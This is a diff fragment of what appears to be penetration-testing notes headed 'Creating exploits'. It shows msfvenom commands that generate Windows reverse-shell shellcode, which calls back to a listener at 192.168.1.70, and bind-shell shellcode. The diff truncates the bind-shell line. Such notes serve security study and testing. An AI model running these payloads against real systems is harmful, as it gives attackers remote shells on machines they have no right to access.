@@ -21,4 +21,4 @@
 # Creating exploits
 
 msfvenom -p windows/shell_reverse_tcp lhost=192.168.1.70 lport=445 EXITFUNC=thread -b "\x00\x07\x2e\xa0" -f c
-msfvenom -p windows/shell_bind_tcp lhost=eth0 lport=1337 EXITFUNC=thread -b "\x00\x07\x2e\xa0" -f c
+msfvenom -p windows/shell_bind_tcp
